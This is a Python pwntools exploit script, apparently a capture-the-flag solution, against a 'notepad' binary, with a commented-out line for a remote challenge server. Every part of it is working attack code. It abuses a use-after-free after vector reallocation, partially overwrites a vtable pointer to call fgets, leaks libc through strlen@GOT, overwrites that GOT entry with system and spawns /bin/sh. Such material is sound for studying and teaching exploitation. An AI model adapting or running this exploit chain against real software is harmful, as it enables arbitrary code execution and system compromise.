#!/usr/bin/env python3

from pwn import *

elf = ELF("./notepad")
libc = ELF("./libc.so.6")
p = process("./notepad")
#p = remote("35.205.119.236", 1337)

def add_note(name, content):
    p.sendlineafter("> ", "1")
    p.sendlineafter("Name: \n", name)
    p.sendlineafter("Content: \n", content)

def find_note(name):
    p.sendlineafter("> ", "2")
    p.sendlineafter("term: \n", str(name))

def handle_note():
    p.sendlineafter("> ", "3")

def main_menu():
    p.sendlineafter("> ", "4")

def edit_note(name, content):
    p.sendlineafter("> ", "2")
    p.sendlineafter("Name: \n", name)
    p.sendlineafter("Content: \n", content)

def lock_note(key, keysize):
    p.sendlineafter("> ", "3")
    p.sendlineafter("Key: \n", str(key))
    p.sendlineafter("Key size: \n", str(keysize))

def view_note():
    p.sendlineafter("> ", "1")

# Create 20 notes, we want a handle to the first few notes so make them unique
add_note("A"*0x100, "A"*0x100)
add_note("B"*0x100, "B"*0x100)
add_note("C"*0x100, "C"*0x100)
add_note("D"*0x100, "D"*0x100)
add_note("E"*0x100, "E"*0x100)
add_note("F"*0x100, "F"*0x100)

for i in range(14):
    add_note("G"*0x100, "G"*0x100)

# Get a pointer to the 2nd note
find_note("B"*0x100)

# Add a 21st note, this will free the vector backing store
add_note("L"*0x100, "L"*0x100)

# We still have a pointer to the old 2nd note, so now we just set the 2nd
# note's ptr's vtable so we can call fgets with |lockNote|. |lockNote| is at
# vtable+0x18, and |fgets@GOT| is at 0x409170
add_note(b"Z"*0x18 + b"\x58\x91\x40", "B"*0x100)

# Clear unsorted bin, otherwise we will be overwriting the fd and bk ptrs
# when we call |fgets|, which will cause malloc errors later on
add_note(b"D"*0x2f0, "B"*0x240)

# Read in 0x48 bytes with the fgets by calling |lockNote|. This will overwrite
# that old 2nd note.
#
# fgets(currentNote_, 0x48, 0x409210)
handle_note()
lock_note(b"\x48", 0x409210)

note_vtable = 0x0000000000408dc0
fgets_got = elf.got["fgets"]
strlen_got = elf.got["strlen"]

# With the overwrite, I restore the original vtable, and set both the |name_|
# and |content_| pointers to point to strlen@GOT
payload = p64(note_vtable)
payload += p64(strlen_got) + p64(0x400)*3
payload += p64(strlen_got) + p64(0x400)*3

p.sendline(payload)

# Viewing the note will print out strlen's libc address from strlen@GOT
view_note()

# Parse the leak
for i in range(3):
    p.recvline()

p.recvuntil("| ")

leak = u64(p.recv(6).ljust(8, b"\x00"))
libc.address = leak - 0x18b660

log.info("Libc leak: " + hex(leak))
log.info("Libc base: " + hex(libc.address))

# Now since both the |name_| and |content_| fields point to strlen@GOT, we just
# edit and set them both to system. This will basically free the old name and
# content and put &system in both of them, and since both of them point to
# strlen@GOT, it will overwrite strlen@GOT with system@LIBC
edit_note(p64(libc.sym["system"]), p64(libc.sym["system"]))

# Just trigger strlen("/bin/sh") to call system("/bin/sh")
p.sendlineafter("> ", "2")
p.sendlineafter("Name: \n", "/bin/sh")

p.interactive()
